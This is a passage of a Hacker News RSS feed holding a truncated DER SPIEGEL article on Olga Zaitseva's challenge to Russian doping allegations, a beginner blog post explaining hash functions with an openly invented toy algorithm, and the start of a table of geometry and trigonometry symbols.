            <pubDate>Sat, 04 Jul 2020 22:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evidence Casts New Doubts on Russian Doping Whistleblower]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23735267">thread link</a>) | @AndrewBissell
<br/>
July 4, 2020 | https://www.spiegel.de/international/world/evidence-casts-new-doubts-on-russian-doping-whistleblower-a-4bba2ee9-4ead-42fd-85d0-56bd87092c93-amp | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/world/evidence-casts-new-doubts-on-russian-doping-whistleblower-a-4bba2ee9-4ead-42fd-85d0-56bd87092c93-amp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Even today, more than five years after the end of her career, Olga Zaitseva says she doesn’t drink from water bottles if they have already been opened. Even when she visits friends, she says she always has a new one brought to her. "It’s an old habit,” she admits, before laughing softly.</p>

<amp-fx-flying-carpet height="300px" id="f29f485c-b8e1-46d6-bc24-e00b5df30b13">
<amp-ad width="300" height="600" layout="fixed" type="doubleclick" data-slot="/6032/sponmew/international_amp" data-multi-size="300x600,300x250" data-multi-size-validation="false" data-ad-container-id="f29f485c-b8e1-46d6-bc24-e00b5df30b13" json="{&quot;targeting&quot;:{&quot;pos&quot;:&quot;2&quot;}}" rtc-config="{&quot;vendors&quot;: {&quot;criteo&quot;: {&quot;NETWORK_ID&quot;: &quot;3335&quot;, &quot;PUBLISHER_SUB_ID&quot;:&quot;testid&quot;},&quot;aps&quot;: {&quot;PUB_ID&quot;: &quot;3493&quot;,&quot;PARAMS&quot;:{&quot;amp&quot;:&quot;2&quot;}}},&quot;timeoutMillis&quot;: 1000}">
</amp-ad>
</amp-fx-flying-carpet>
<div>
<p>Zaitseva, 42, has retained the quirk from her past life. The Russian with blonde curls and narrow eyes was once one of the world’s best biathletes, an Olympic champion. Her success put her in the near-constant sights of doping-control officers.</p><p>She took special precautions to make sure that she never consumed anything that was prohibited. "As an athlete, I was responsible for what went into my body, which is why I always carried my own water bottles with me,” she says. "That way I could make sure that no one slipped anything into it.” When Zaitseva ended her career in January 2015, after hundreds of competitions and countless doping tests, she was considered a clean athlete.</p>
</div>
<amp-layout width="300" height="266" id="3fc50d00-c996-40f3-a803-8bc46945608c">
<p>ANZEIGE</p>
<amp-ad width="300" height="250" type="doubleclick" data-slot="/6032/sponmew/international_amp" data-multi-size="300x250,300x150,300x100,300x75,300x50" data-multi-size-validation="false" data-ad-container-id="3fc50d00-c996-40f3-a803-8bc46945608c" json="{&quot;targeting&quot;:{&quot;pos&quot;:&quot;3&quot;}}" rtc-config="{&quot;vendors&quot;: {&quot;criteo&quot;: {&quot;NETWORK_ID&quot;: &quot;3335&quot;, &quot;PUBLISHER_SUB_ID&quot;:&quot;testid&quot;},&quot;aps&quot;: {&quot;PUB_ID&quot;: &quot;3493&quot;,&quot;PARAMS&quot;:{&quot;amp&quot;:&quot;3&quot;}}},&quot;timeoutMillis&quot;: 1000}">
</amp-ad>
</amp-layout>
<amp-layout width="300" height="300" id="054879ab-24ff-4552-9b24-57c8ca04a83a">
<amp-ad width="300" height="300" layout="responsive" type="conative" sizes="(min-width: 320px) 320px, 100vw" data-domain="158" data-adslot="1997" data-ad-container-id="054879ab-24ff-4552-9b24-57c8ca04a83a">
</amp-ad>
</amp-layout>
<div>
<p><strong>Banned for Life</strong></p><p>In the coming days, three judges at the Court of Arbitration for Sport (CAS) in Lausanne, Switzerland, will determine whether that claim still holds true. In 2017, the International Olympic Committee (IOC) banned the Russian athlete for life over violations of anti-doping regulations. The IOC claimed Zaitseva had profited from a system of fraud that concealed massive Russian doping at the 2014 Winter Olympics in Sochi at the behest of the government.</p><p>Zaitseva says she has "never, ever, ever, ever, ever” doped in her life, "and if I have to, I will gladly repeat that a million times.” Zaitseva appealed the decision together with two other female athletes who were also banned by the IOC.</p>
</div>
<amp-layout width="300" height="266" id="bcb85df3-31ea-48dc-9788-af237f06a092">
<p>ANZEIGE</p>
<amp-ad width="300" height="250" type="doubleclick" data-slot="/6032/sponmew/international_amp" data-multi-size="300x250,300x150,300x100,300x75,300x50" data-multi-size-validation="false" data-ad-container-id="bcb85df3-31ea-48dc-9788-af237f06a092" json="{&quot;targeting&quot;:{&quot;pos&quot;:&quot;4&quot;}}" rtc-config="{&quot;vendors&quot;: {&quot;criteo&quot;: {&quot;NETWORK_ID&quot;: &quot;3335&quot;, &quot;PUBLISHER_SUB_ID&quot;:&quot;testid&quot;},&quot;aps&quot;: {&quot;PUB_ID&quot;: &quot;3493&quot;,&quot;PARAMS&quot;:{&quot;amp&quot;:&quot;4&quot;}}},&quot;timeoutMillis&quot;: 1000}">
</amp-ad>
</amp-layout>
<p>On the surface, the proceedings seem like just another chapter in the endless Russian doping scandal that has gripped the sporting world for more than five years now. But the credibility of the most important key witness to the mass fraud is on the line, and if the court sides with the Russian athletes, it could trigger a domino effect, given that other cases are still pending. The three biathletes also filed a $30-million (27-million-euro) lawsuit in New York against Russia’s former anti-doping laboratory director, who lives in hiding in the United States. In their suit, they claim they are the victims of defamation and that their names, victories and honors have been vilified for no reason.</p>
<amp-layout width="300" height="266" id="83009c8b-01e9-456e-9699-c3f865180efd">
<p>ANZEIGE</p>
<amp-ad width="300" height="250" type="doubleclick" data-slot="/6032/sponmew/international_amp" data-multi-size="300x250,300x150,300x100,300x75,300x50" data-multi-size-validation="false" data-ad-container-id="83009c8b-01e9-456e-9699-c3f865180efd" json="{&quot;targeting&quot;:{&quot;pos&quot;:&quot;5&quot;}}" rtc-config="{&quot;vendors&quot;: {&quot;criteo&quot;: {&quot;NETWORK_ID&quot;: &quot;3335&quot;, &quot;PUBLISHER_SUB_ID&quot;:&quot;testid&quot;},&quot;aps&quot;: {&quot;PUB_ID&quot;: &quot;3493&quot;,&quot;PARAMS&quot;:{&quot;amp&quot;:&quot;5&quot;}}},&quot;timeoutMillis&quot;: 1000}">
</amp-ad>
</amp-layout>
<div>
<p>Several pieces of evidence in the files from the Swiss proceedings that DER SPIEGEL has viewed in recent weeks seem not only to substantiate Zaitseva’s claims of innocence, they also appear to raise questions about the overall credibility of the investigation into the Sochi conspiracy and whether too much faith was placed in the account provided by the whistleblower in the scandal.</p><p><strong>An Old Conflict Flares Up Again</strong></p><p>The case has long been a political issue. In recent years, forensic scientists and special investigators have been poring over urine samples and scientific evaluations in hopes of a resolution, and parliaments and heads of state have either condemned or categorically denied Russia’s systemic fraud. It has rekindled a conflict between East and West and between hopelessly overburdened sporting associations.</p><p>What is certain is that many Russian athletes have been cheating the system. Russia’s track and field federation has been suspended from international competitions since 2015. In 2019, the World Anti-Doping Agency (WADA), recommended the Russian flag and national anthem be banned from the Olympic Games and other major events for four years in response to the tricks used by Moscow in its efforts to hinder the investigation into the doping scandal.</p>
</div>

<section data-area="contentbox">

</section>
<div>
<p>This includes events that allegedly took place in Sochi. What is known about them is largely attributable to the descriptions and records of a key witness: Grigory Rodchenkov, 61. The chemist headed Russia’s national anti-doping laboratory until 2015, when he moved to the United States. There, he shared his account of what allegedly happened in Sochi with the <em>New York Times</em>. In his version of events, the urine of Russian medal candidates contaminated with banned substances at the Winter Games were secretly swapped with clean urine, presumably with the help of Russia’s secret service, the FSB. Rodchenkov has led such an exuberant life that Netflix even made the two-hour documentary film "Icarus” about it.</p><p>WADA appointed a special investigator, and subsequent analyses of Russian urine samples from Sochi revealed indications of urine tampering. Ultimately, the IOC felt the circumstantial evidence was strong enough to sanction the athletes. In several affidavits, Rodchenkov provided the names of athletes who were allegedly doped in Sochi and presented lists of competitors who, he claimed, were provided with protection by the Sports Ministry. Three years ago, this led the IOC to sanction 43 athletes and remove them from the results lists of the Sochi Olympics.</p><p>Almost all of those cases were appealed, and 28 were successful in getting the decision overturned. The decisions to reverse the sanctions were made due to insufficient evidence. Three rulings are still pending - the one for Zaitseva and the other two biathletes.</p><p><strong>A "Made-Up Story”</strong></p><p>Zaitseva claims that Rodchenkov’s portrayal of events is a "made-up story.” In a video call from Moscow, she says she has never seen him in her life. So why does he mention her explicitly in documents, in one case even describing a meeting with her? "I have no explanation for all these lies,” Zaitseva says, "except that he must be crazy.”</p><p>Rodchenkov claims that Zaitseva doped using EPO, a blood booster, and that, like many Russian medal candidates, she was given what was called the "Duchess cocktail,” a mixture of three anabolic steroids.</p><p>"None of it is true," says Zaitseva.</p><p>Wolfgang Pichler also believes the story about "this cocktail is total rubbish.” The Bavarian is considered one of the world’s best biathlon coaches and known as a champion of doping-free sports. After German reunification, he campaigned against the German Ski Association accepting former East German coaches who had been suspected of involvement in the regime’s doping programs. In 2009, he also demanded the exclusion of Russian biathletes from the Olympic Games following doping revelations. Then he became Russia’s head coach in 2011, and later took over a five-person training group that included Zaitseva.</p>
</div>

<div>
<p>The main training center was set up in Pichler’s hometown of Ruhpolding. Most of the other training camps also took place in Europe. "We were almost entirely under WADA’s control,” Pichler says. He also took blood from his charges each day of training to determine stress limits. If one of his charges had doped, he says he would have noticed.</p><p>But what about the cocktail? "A pipe dream,” Pichler claims. The coach says he said the very same thing during a hearing in Lausanne, Switzerland.</p><p>Four doping samples were taken from Zaitseva at Sochi – three urine and one blood. During follow-up analyses, investigators argued that the salt concentration in a urine sample was too high.</p><p><strong>Natural Cause Could not Be Ruled Out</strong></p><p>But experts believed that wasn’t enough to suggest the sample had been tampered with. Two expert opinions, including one from a renowned New York institute, were submitted during the Lausanne proceedings. Both stated that a natural cause for Zaitseva's salt value could not be ruled out. Zaitseva says she has always had a high-sodium diet, with lots of smoked salmon and red caviar, which were also served at the cafeteria in the Olympic Village.</p><p>The IOC re-examined Zaitseva’s blood sample, with negative results. If Zaitseva had cheated, they ought to have found traces of EPO- or anabolic doping. Unlike the urine samples, the blood samples at the Olympics were never secretly swapped.</p><p>Rodchenkov's statements about Zaitseva reach beyond Sochi. He claims, for example, that the biathlete ended her career at the end of 2014 by order of the Sports Ministry, because her blood values hadn’t normalized. Zaitseva did in fact announce her resignation in January 2015. "I was pregnant,” she says, nothing else. Her second son was born that October.</p>
</div>
<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;f2bbf142-3010-44ba-b368-dcf55aa88413&quot;, &quot;zoomable&quot;:true}">
<div>
<div>
<figcaption>
<p>Zaitseva, pictured here in Moscow at the end of June, was banned from competition as a biathlete for life by the IOC.</p>
<span>
Foto: Yuriy Chichkov/ DER SPIEGEL
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>The test results from another urine sample the IOC introduced as evidence in the proceedings against Zaitseva also fall into this context. The sample is from October 2014 and contains DNA from two people – Zatiseva’s and, it would later be revealed, from a man. The IOC investigators considered this to be further evidence of fraud.</p><p>Zaitseva says she was shocked when she found out about it. "How do you think it feels to have to tell your husband that male DNA was found in your urine? That story could have destroyed my family.” It took years to identify the foreign DNA. According to the forensic reports viewed by DER SPIEGEL, it came from Zaitseva’s husband. They say the couple likely had sex shortly before the doping test.</p><p><strong>"It’s Like Getting Accused of Murder”</strong></p><p>Zaitseva says yes, she was trying to get pregnant at the time. She says the proceedings destroyed her reputation. "It’s like getting accused of murder, even though you haven’t hurt anyone,” she says.</p><p>She fought back, along with the other biathletes who had been accused of doping, and filed a lawsuit against Rodchenkov in New York. Mikhail Prokhorov, a man as glamorous as he is influential, is covering some of the costs of the women’s suit. The Russian billionaire is the former president of the Russian Biathlon Association and was the owner of the Brooklyn Nets NBA basketball team, among others.</p><p>The proceedings in the New York case are currently in recess. Both sides have agreed to wait for the outcome of the CAS ruling. The Russian side is counting on a reversal of the sanctions in Lausanne, which they believe could shift the lawsuit …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/world/evidence-casts-new-doubts-on-russian-doping-whistleblower-a-4bba2ee9-4ead-42fd-85d0-56bd87092c93-amp">https://www.spiegel.de/international/world/evidence-casts-new-doubts-on-russian-doping-whistleblower-a-4bba2ee9-4ead-42fd-85d0-56bd87092c93-amp</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/world/evidence-casts-new-doubts-on-russian-doping-whistleblower-a-4bba2ee9-4ead-42fd-85d0-56bd87092c93-amp</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735267</guid>
            <pubDate>Sat, 04 Jul 2020 22:10:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Very) Basic Intro to Hash Functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23735076">thread link</a>) | @lanecwagner
<br/>
July 4, 2020 | https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			




<p>This is going to be a basic introduction to hash functions. I will assume most of my audience is here to gain an understanding of why hash functions are used and the basic idea of why they work. My goal is to explain it in a general sense, I will be omitting proofs and implementation details and instead focusing on the high-level principles.</p>







<p>Hash functions are used all over the internet in order to securely store passwords, find duplicate records, quickly store and retrieve data, and more. For example,&nbsp;<a href="https://qvault.io/" target="_blank" rel="noreferrer noopener">Qvault</a>&nbsp;uses hashes to extend master passwords into private encryption keys.</p>



<p><em>A longer list of uses here:&nbsp;</em><a href="https://en.wikipedia.org/wiki/Hash_function#Uses" target="_blank" rel="noreferrer noopener"><em>https://en.wikipedia.org/wiki/Hash_function#Uses</em></a></p>



<p>I want to focus on several important features of hash functions, arguably the most important features.</p>



<ul>
<li>Hash functions scramble data deterministically</li>
<li>No matter the input, the output of a hash function always has the same size</li>
<li>The original data can not be retrieved from the scrambled data (one-way function)</li>
</ul>




<p>Think of a Rubix cube.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1024x576.jpeg" alt="completed rubix cube " srcset="https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1024x576.jpeg 1024w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-300x169.jpeg 300w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-768x432.jpeg 768w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-100x56.jpeg 100w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1200x675.jpeg 1200w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA.jpeg 1280w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1024x576.jpeg 1024w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-300x169.jpeg 300w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-768x432.jpeg 768w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-100x56.jpeg 100w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1200x675.jpeg 1200w, https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA.jpeg 1280w" data-src="https://qvault.io/wp-content/uploads/2020/01/1_-PWqlRo2P97cfzZAbdVMlA-1024x576.jpeg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>I start with the cube unscrambled. If I start twisting randomly, by the end I will end up with something that does not resemble anything close to what I started with. Also, if I were to start over and do the exact same series of moves, I would be able to repeatedly get the exact same outcome. Even though the outcome may<em>&nbsp;appear&nbsp;</em>random, it isn’t at all. That is what&nbsp;<strong>deterministic&nbsp;</strong>means.</p>



<p>Determinism is important for securely storing a password. For instance, let’s pretend my password is “iLoveBitcoin”</p>



<p>I can use a hash function to scramble it:</p>



<blockquote><p>iLoveBitcoin → “2f5sfsdfs5s1fsfsdf98ss4f84sfs6d5fs2d1fdf15”</p></blockquote>



<p>Now, if anyone were to see the scrambled version, they wouldn’t know my original password! This is important because it means that as a website developer, I only need to store the hash (scrambled data) of my user’s password to be able to verify them. When the user signs up, I hash the password and store it in my database. When the user logs in, I just hash what they typed in and compare the two hashes. Because a given input always produces the same hash, this works every time.</p>


<p><span><span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwp.me%2Fpb7Qei-9C&amp;text=It%20is%20a%20huge%20breach%20of%20security%20when%20websites%20store%20passwords%20in%20plain-text.%20If%20someone%20hacks%20one%20such%20site%2C%20they%20will%20find%20all%20the%20emails%20and%20passwords%20and%20can%20try%20those%20combinations%20on%20other%20websites.&amp;via=wagslane&amp;related=wagslane" target="_blank" rel="noopener noreferrer">It is a huge breach of security when websites store passwords in plain-text. If someone hacks one such site, they will find all the emails and passwords and can try those combinations on other websites. </a></span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwp.me%2Fpb7Qei-9C&amp;text=It%20is%20a%20huge%20breach%20of%20security%20when%20websites%20store%20passwords%20in%20plain-text.%20If%20someone%20hacks%20one%20such%20site%2C%20they%20will%20find%20all%20the%20emails%20and%20passwords%20and%20can%20try%20those%20combinations%20on%20other%20websites.&amp;via=wagslane&amp;related=wagslane" target="_blank" rel="noopener noreferrer">Click To Tweet</a></span></p>



<p>If I hash a single word the output will be a certain size (in the case of SHA-256, a particular hashing function, the size is 256 bits). If I hash a book, the output will be&nbsp;<em>the same size</em>.</p>



<p>This is another important feature because it can save us computing time. A classic example is using a hash as a key in a data map. A data map is a simple structure used in computer science to store data.</p>







<p>When a program stores data in a map, a key and value are given to the map. When a program wants to access the value, it can give the appropriate key to the map and receive the corresponding value. Data maps are good because they can find data&nbsp;<em>instantly.&nbsp;</em>The key is used as an address that the computer can find immediately, instead of taking hours searching through millions of records.</p>



<p>Because keys are like addresses, they can’t be too large. If I want to store books in a data map I can hash the contents of the book and use the hash as a key. As a programmer, I can simply use the hash to look up the contents of the book instead of trying to sort through thousands of records by title, author, etc.</p>







<p>Here is the real challenge of writing this article. I’m going to keep it extremely simple and omit the actual implementation details while giving you a basic idea of what the computer actually does when it hashes some data.</p>



<p>Let’s walk through an example algorithm I’m making up on the fly for this demonstration,&nbsp;<strong>LANEHASH:</strong></p>



<ul><li>We start with some data to hash</li></ul>
<blockquote><p>iLoveBitcoin</p></blockquote>



<ul><li>I convert the letters and numbers into 1’s and 0’s (All data in computers are stored in 1’s and 0’s, different patterns of 1’s and 0’s represent different letters)</li></ul>
<blockquote><p>iLoveBitcoin→ 100010100000101111</p></blockquote>



<ul>
<li>At this point we go through various predetermined steps to transform our data. The steps can be anything, the important thing is that whenever we use LANEHASH we need to use the same steps so that our algorithm is deterministic.</li>
<li>We move the first four bits from the left side to the right</li>
</ul>
<blockquote><p><strong>1000</strong>10100000101111 → 10100000101111<strong>1000</strong></p></blockquote>



<ul><li>We separate every other bit</li></ul>
<blockquote><p><strong>1</strong>0<strong>1</strong>0<strong>0</strong>0<strong>0</strong>0<strong>1</strong>0<strong>1</strong>1<strong>1</strong>1<strong>1</strong>0<strong>0</strong>0 → 110011110 &amp; 000001100</p></blockquote>



<ul><li>We convert those two parts into base 10 numbers. Base 10 is the “normal” number system that we all learned in school. (all binary data really just number, you can look up how it converts binary to base 10 easily online elsewhere)</li></ul>
<blockquote>
<p>110011110 → 414</p>
<p>000001100→ 12</p>
</blockquote>



<ul><li>We multiply the two numbers together</li></ul>
<blockquote><p>414 *12 = 4968</p></blockquote>



<ul><li>We square that number</li></ul>
<blockquote><p>4968 ^ 2 = 24681024</p></blockquote>



<ul><li>We convert that number back to binary</li></ul>
<blockquote><p>24681024 →1011110001001101001000000</p></blockquote>



<ul><li>We chop 9 bits off the right side to get exactly 16 bits</li></ul>
<blockquote><p>1011110001001101<strong>001000000</strong>&nbsp;→ 1011110001001101</p></blockquote>



<ul><li>We convert that binary data back to English</li></ul>
<blockquote><p>1011110001001101&nbsp;→ “8sj209dsns02k2”</p></blockquote>



<p>As you can see, if you start with the same word at the beginning, you will always get the same output at the end. However, if you even change one letter, the outcome will be drastically changed.</p>







<p>On the steps where I convert from English to binary, and from binary to English, I followed no pattern. Don’t let that confuse you. There are many different ways to convert binary data to English and back, I just didn’t want to get hung up on that in this article. Here are some references on that subject:</p>



<p><a href="https://en.wikipedia.org/wiki/ASCII">https://en.wikipedia.org/wiki/ASCII</a></p>



<p><a href="https://en.wikipedia.org/wiki/Unicode">https://en.wikipedia.org/wiki/Unicode</a></p>



<div><div>
<h2><span id="Thanks_For_Reading">Thanks For Reading</span>
</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>


		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735076</guid>
            <pubDate>Sat, 04 Jul 2020 21:37:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Geometry and trigonometry in 10 diagrams and 100 symbols]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734952">thread link</a>) | @R3G1R
<br/>
July 4, 2020 | https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/ | <a href="https://web.archive.org/web/*/https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><p><strong><span>G</span>eometry</strong> and <strong>trigonometry</strong> are branches of mathematics concerned with geometrical figures and angles of triangles. The following list documents some of the most notable symbols in these topics, along with each symbol’s usage and meaning.</p><p>For readability purpose, these symbols are categorized by their <strong>function</strong> into tables. Other comprehensive lists of <a href="https://mathvault.ca/hub/higher-math/math-symbols/" target="_blank" aria-label="math symbols (opens in a new tab)" rel="noreferrer noopener">math symbols</a> — as categorized by subject&nbsp;and type — can be also found in the relevant pages below (or in the navigational panel).</p><div><div><div><figure><img src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png" alt="Cover of Math Vault's Comprehensive List of Mathematical Symbols eBook" title="Math Symbols eBook Cover" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png"></figure><div><p>Prefer the PDF version instead?</p><p>Get the master summary of mathematical symbols in <strong>eBook form</strong> — along with each symbol’s usage and LaTeX code.</p> </div></div></div></div><h2>Point/Line-related Symbols<span></span></h2><p>In geometry, <strong>points</strong> and <strong>lines</strong> form the foundation of more complex geometrical figures such as triangles, circles, quadrilaterals and polygons. The following table documents some of the most notable symbols related to these — along with each symbol’s meaning and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$A$, $B$, $C$, $D$,<br>$P$, $Q$, $R$, $S$</td><td>Variables for <strong>points</strong></td><td>If $P_1 =P_2$, then $\overline{P_1 Q} = \overline{P_2 Q}$.</td></tr><tr><td>$\ell$</td><td>Variable for <strong><a href="https://en.wikipedia.org/wiki/Line_(geometry)" target="_blank" aria-label="lines (opens in a new tab)" rel="noreferrer noopener">lines</a></strong></td><td>$\ell_1 \parallel \ell_2$</td></tr><tr><td>$\overleftrightarrow{AB}$</td><td><strong>(Infinite) line</strong> formed by points $A$ and $B$</td><td>$\overleftrightarrow{AB}=\overleftrightarrow{BA}$</td></tr><tr><td>$\overline{AB}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Line_segment" target="_blank" aria-label="Line segment (opens in a new tab)" rel="noreferrer noopener">Line segment</a></strong> between points $A$ and $B$</td><td>$\overline{AB} \cong \overline{PQ}$</td></tr><tr><td>$\overrightarrow{AB}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Line_(geometry)#Ray" target="_blank" aria-label="Ray (opens in a new tab)" rel="noreferrer noopener">Ray</a></strong> from point $A$ to point $B$</td><td>$\overrightarrow{AB} \ne \overrightarrow{BA}$</td></tr><tr><td>$|AB|$</td><td><strong><a href="https://en.wikipedia.org/wiki/Distance#Geometry" target="_blank" aria-label="Distance (opens in a new tab)" rel="noreferrer noopener">Distance</a></strong> from point $A$ to point $B$</td><td>$|BC| \le \\ |AB| + |AC|$</td></tr><tr><td>$\ell_1 \parallel \ell_2$</td><td>Lines $\ell_1$ and $\ell_2$ are <strong><a href="https://en.wikipedia.org/wiki/Parallel_(geometry)" target="_blank" aria-label="parallel (opens in a new tab)" rel="noreferrer noopener">parallel</a></strong></td><td>If $\square ABCD$ is a parallelogram, then $\overline{AB} \parallel \overline{CD}$.</td></tr><tr><td>$\ell_1 \nparallel \ell_2$</td><td>Lines $\ell_1$ and $\ell_2$ are <strong>non-parallel</strong></td><td>If $\overleftrightarrow{PQ} \nparallel \overleftrightarrow{RS}$, then they must intersect at a point $A$.</td></tr><tr><td>$\ell_1 \perp \ell_2$</td><td>Lines $\ell_1$ and $\ell_2$ are <strong><a href="https://en.wikipedia.org/wiki/Perpendicular" target="_blank" aria-label="perpendicular (opens in a new tab)" rel="noreferrer noopener">perpendicular</a></strong></td><td>If $\overline{AB} \perp \overline{BC}$, then $|AC|^2 = |AB|^2 + \\ |BC|^2.$</td></tr><tr><td>$\ell_1 \not\perp \ell_2$</td><td>Lines $\ell_1$ and $\ell_2$ are <strong>non-perpendicular</strong></td><td>If $\overline{AB} \not\perp \overline{BC}$, then $\square ABCD$ is not a <a aria-label="rectangle (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Rectangle" target="_blank">rectangle</a>.</td></tr></tbody></table></figure><h2>Angle-related Symbols<span></span></h2><p>An <strong>angle</strong> essentially corresponds to an “opening” of a geometrical figure, whose quantification leads to much development in geometry and trigonometry. The following table documents some of the most notable symbols related to angles — along with each symbol’s meaning and example.</p><figure><table><thead><tr><th>hSymbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$a, b, c$, $\alpha$ (<a aria-label="alpha (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank">alpha</a>),<br>$\beta$ (<a aria-label="beta (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank">beta</a>), $\gamma$ (<a aria-label="gamma (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank">gamma</a>),<br>$\theta$ (<a aria-label="theta (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank">theta</a>), $\phi$ (<a aria-label="phi (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank">phi</a>)</td><td>Variables for <strong><a href="https://en.wikipedia.org/wiki/Angle" target="_blank" aria-label="angles (opens in a new tab)" rel="noreferrer noopener">angles</a></strong></td><td>$\alpha + \beta &lt; \gamma$</td></tr><tr><td>$^{\circ}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Degree_(angle)" target="_blank" aria-label="Degree (opens in a new tab)" rel="noreferrer noopener">Degree</a></strong> symbol</td><td>$\alpha = 180^{\circ} – \beta$</td></tr><tr><td>$\mathrm{rad}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Radian" target="_blank" aria-label="Radian (opens in a new tab)" rel="noreferrer noopener">Radian</a></strong> symbol</td><td>$\pi \, \mathrm{rad} = 180^{\circ}$</td></tr><tr><td>$\mathrm{grad}$, $^{\mathrm{g}}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Gradian" target="_blank" aria-label="Gradian (opens in a new tab)" rel="noreferrer noopener">Gradian</a></strong> symbol</td><td>$100 \, \mathrm{grad} = 90^{\circ}$</td></tr><tr><td>$\angle ABC$</td><td><strong>Angle</strong> formed by points $A$, $B$ and $C$</td><td>$\angle ABC = \angle CBA$</td></tr><tr><td>$\angle P$</td><td><strong><a href="https://en.wikipedia.org/wiki/Internal_and_external_angles" target="_blank" aria-label="Interior angle (opens in a new tab)" rel="noreferrer noopener">Interior angle</a></strong> at point $P$</td><td>$m \angle P + m \angle Q = 90^{\circ}$</td></tr><tr><td>$\measuredangle ABC$, $m\angle ABC$</td><td><strong>Measure</strong> of angle formed by points $A$, $B$ and $C$</td><td>$\measuredangle PQR \approx 54^{\circ}$</td></tr><tr><td>$\sphericalangle ABC$</td><td><strong><a aria-label="Spherical angle (opens in a new tab)" href="https://en.wikipedia.org/wiki/Spherical_angle" target="_blank" rel="noreferrer noopener">Spherical angle</a></strong> formed by points $A$, $B$ and $C$</td><td>If $P$, $Q$, $R$ lie on a sphere, then $\sphericalangle PQR$ is the spherical angle between $\overparen{PQ}$ and $\overparen{QR}$.</td></tr><tr><td>$’$</td><td><strong><a href="https://en.wikipedia.org/wiki/Minute_and_second_of_arc" target="_blank" aria-label="Arcminute 